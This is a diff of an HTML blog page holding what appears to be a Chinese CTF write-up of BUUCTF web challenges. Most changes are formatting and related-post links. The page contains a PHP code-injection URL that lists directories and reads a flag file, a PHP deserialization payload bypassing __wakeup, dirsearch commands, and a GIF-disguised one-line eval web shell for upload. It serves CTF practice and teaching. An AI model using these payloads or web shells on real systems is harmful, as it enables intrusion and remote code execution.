-<pre class="chroma"><code class="language-php" data-lang="php"><span class="c1"># 扫描根目录
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1"># 扫描根目录
 </span><span class="c1"></span><span class="nx">http</span><span class="o">://</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">25448</span><span class="o">/</span><span class="nx">calc</span><span class="o">.</span><span class="nx">php</span><span class="o">?%</span><span class="mi">20</span><span class="nx">num</span><span class="o">=</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">))</span>
 
 <span class="c1"># ==&gt;
@@ -725,7 +725,7 @@
 </div>
 </div><div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -738,7 +738,7 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="c1"># var_dump() 函数用于输出变量的相关信息。
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1"># var_dump() 函数用于输出变量的相关信息。
 </span><span class="c1"></span><span class="nx">http</span><span class="o">://</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">25448</span><span class="o">/</span><span class="nx">calc</span><span class="o">.</span><span class="nx">php</span><span class="o">?%</span><span class="mi">20</span><span class="nx">num</span><span class="o">=</span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)))</span>
 
 <span class="o">==&gt;</span>
@@ -754,13 +754,13 @@
 </div><p><font color=#A020F0>读取 flagg 文件，因为不知道是不是文件夹，所有用 scandir()扫一下 /flagg，返回 false ，说明是个文本文件</font></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">25448</span><span class="o">/</span><span class="nx">calc</span><span class="o">.</span><span class="nx">php</span><span class="o">?%</span><span class="mi">20</span><span class="nx">num</span><span class="o">=</span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">)))</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">25448</span><span class="o">/</span><span class="nx">calc</span><span class="o">.</span><span class="nx">php</span><span class="o">?%</span><span class="mi">20</span><span class="nx">num</span><span class="o">=</span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">)))</span>
 
 <span class="c1"># ==&gt;
 </span><span class="c1"># bool(false) 
@@ -769,13 +769,13 @@
 </div><p>使用 <strong>file_get_contents()</strong> 函数将文本文件读入到字符串输出：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">25448</span><span class="o">/</span><span class="nx">calc</span><span class="o">.</span><span class="nx">php</span><span class="o">?%</span><span class="mi">20</span><span class="nx">num</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">))</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">http</span><span class="o">://</span><span class="nx">node3</span><span class="o">.</span><span class="nx">buuoj</span><span class="o">.</span><span class="nx">cn</span><span class="o">:</span><span class="mi">25448</span><span class="o">/</span><span class="nx">calc</span><span class="o">.</span><span class="nx">php</span><span class="o">?%</span><span class="mi">20</span><span class="nx">num</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">47</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">102</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">)</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">103</span><span class="p">))</span>
 
 <span class="c1"># ==&gt;
 </span><span class="c1"># flag{9176a86b-0aba-4b11-987f-500dfb236447} 
@@ -792,7 +792,7 @@
 <p>使用：./dirsearch.py -u 目标网址 -e *</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -802,21 +802,21 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#参数</span>
-<span class="o">-</span><span class="n">u</span> <span class="err">指定</span><span class="n">url</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">#参数</span>
+<span class="o">-</span><span class="n">u</span> <span class="n">指定url</span>
 
-<span class="o">-</span><span class="n">e</span> <span class="err">指定网站语言</span>
+<span class="o">-</span><span class="n">e</span> <span class="n">指定网站语言</span>
 
-<span class="o">-</span><span class="n">w</span> <span class="err">可以加上自己的字典（带上路径）</span>
+<span class="o">-</span><span class="n">w</span> <span class="n">可以加上自己的字典</span><span class="err">（</span><span class="n">带上路径</span><span class="err">）</span>
 
-<span class="o">-</span><span class="n">r</span> <span class="err">递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）</span>
+<span class="o">-</span><span class="n">r</span> <span class="n">递归跑</span><span class="err">（</span><span class="n">查到一个目录后</span><span class="err">，</span><span class="n">在目录后在重复跑</span><span class="err">，</span><span class="n">很慢</span><span class="err">，</span><span class="n">不建议用</span><span class="err">）</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><blockquote>
 <p><strong>PHP序列化与反序列化</strong></p>
 </blockquote>
 <p><strong>1： public、protected与private在序列化时的区别</strong></p>
-<pre><code>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字
+<pre tabindex="0"><code>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字
 段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，
 而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，
 只是用它来代替ASCII值为0的字符。必须用python传值才可以。
@@ -827,7 +827,7 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
 </code></pre><p><strong>3：__wakeup()方法绕过</strong>
 一个经常被用来出题的函数
 (CVE-2016-7124)</p>
-<pre><code>作用：与__sleep()函数相反，__sleep()函数，是在序列化时被自动调用。__wakeup()函数，在反序列化时，
+<pre tabindex="0"><code>作用：与__sleep()函数相反，__sleep()函数，是在序列化时被自动调用。__wakeup()函数，在反序列化时，
 被自动调用。
 
 绕过：当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。
@@ -835,12 +835,12 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
 <p>题目提示备份网站，题目给的站点不能查看到源代码。直接使用 dirsearch 爆破网站目录。既然是备份网站，那么应该在 www目录下备份。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#执行</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1">#执行</span>
 
 <span class="o">./</span><span class="n">dirsearch</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">0</span><span class="n">ea220ee</span><span class="o">-</span><span class="n">c083</span><span class="o">-</span><span class="mi">4</span><span class="n">f2a</span><span class="o">-</span><span class="mi">9</span><span class="n">b17</span><span class="o">-</span><span class="mi">3513</span><span class="n">bd1142d5</span><span class="o">.</span><span class="n">node4</span><span class="o">.</span><span class="n">buuoj</span><span class="o">.</span><span class="n">cn</span><span class="o">/</span> <span class="o">-</span><span class="n">e</span> <span class="n">php</span>  
 </code></pre></td></tr></table></div>
@@ -855,7 +855,7 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
 </blockquote>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -872,7 +872,7 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
         <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">!=</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
             <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&#34;</span><span class="p">;</span>
             <span class="k">echo</span> <span class="s2">&#34;You name is: &#34;</span><span class="p">;</span>
@@ -892,7 +892,7 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
 </div><p><strong>构造序列化：</strong></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -910,7 +910,7 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 
 <span class="k">class</span> <span class="nc">Name</span><span class="p">{</span>
     <span class="k">private</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s1">&#39;nonono&#39;</span><span class="p">;</span>
@@ -931,31 +931,31 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
 </div><p><strong>得到的序列化：</strong></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Name&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;Nameusername&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;Namepassword&#34;</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">100</span><span class="p">;}</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Name&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;Nameusername&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;Namepassword&#34;</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">100</span><span class="p">;}</span>
 </code></pre></td></tr></table></div>
 </div>
-</div><pre><code>接下来我们需要绕过  __wakeup() ，因为在反序列化的时候会首先执行  __wakeup() 魔术方法，
+</div><pre tabindex="0"><code>接下来我们需要绕过  __wakeup() ，因为在反序列化的时候会首先执行  __wakeup() 魔术方法，
 这个方法会把我们的username重新赋值
 </code></pre><p><strong>将序列化修改为：</strong></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Name&#34;</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;Nameusername&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;Namepassword&#34;</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">100</span><span class="p">;}</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Name&#34;</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;Nameusername&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;Namepassword&#34;</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">100</span><span class="p">;}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>又因为变量是 private类，private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度</p>
 <p><strong>再次修改：</strong></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Name&#34;</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;%00Name%00username&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;%00Name%00password&#34;</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">100</span><span class="p">;}</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;Name&#34;</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;%00Name%00username&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">&#34;%00Name%00password&#34;</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">100</span><span class="p">;}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p><strong>使用get请求把我们准备好的序列化当作select的参数传递过去</strong></p>
@@ -978,10 +978,10 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
 <p>常用一句话：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">GIF89a</span><span class="o">?</span> <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&#34;php&#34;</span><span class="o">&gt;</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">shell</span><span class="p">])</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">GIF89a</span><span class="o">?</span> <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&#34;php&#34;</span><span class="o">&gt;</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">shell</span><span class="p">])</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h3 id="font-colora020f0题目分析font-5"><a href="#font-colora020f0题目分析font-5" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:font-colora020f0题目分析font-5" class="headings"><font color=#A020F0>题目分析</font></a></h3>
@@ -989,10 +989,10 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
 <p><strong>1、写一个木马文件，shell.phtml</strong></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">GIF89a</span><span class="o">?</span> <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&#34;php&#34;</span><span class="o">&gt;</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">shell</span><span class="p">])</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">GIF89a</span><span class="o">?</span> <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&#34;php&#34;</span><span class="o">&gt;</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">shell</span><span class="p">])</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><blockquote>
@@ -1018,10 +1018,10 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
 <p>将一句话：写入文件 1.png</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">GIF89a</span><span class="o">?</span> <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&#34;php&#34;</span><span class="o">&gt;</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">shell</span><span class="p">])</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">GIF89a</span><span class="o">?</span> <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&#34;php&#34;</span><span class="o">&gt;</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">shell</span><span class="p">])</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><blockquote>
@@ -1098,6 +1098,10 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
                     </li>
                 
                     <li class="related-item">
+                        <a href="/posts/buumisc%E9%80%9A%E5%85%B39/" class="related-link">BUUMisc通关9</a>
+                    </li>
+                
+                    <li class="related-item">
                         <a href="/posts/buumisc%E9%80%9A%E5%85%B38/" class="related-link">BUUMisc通关8</a>
                     </li>
                 
@@ -1107,10 +1111,6 @@ private 声明的字段为私有字段，只在所声明的类中可见，在该
                 
                     <li class="related-item">
                         <a href="/posts/buumisc%E9%80%9A%E5%85%B36/" class="related-link">BUUMisc通关6</a>
-                    </li>
-                
-                    <li class="related-item">
-                        <a href="/posts/buumisc%E9%80%9A%E5%85%B35/" class="related-link">BUUMisc通关5</a>
                     </li>
                 
             </ul>
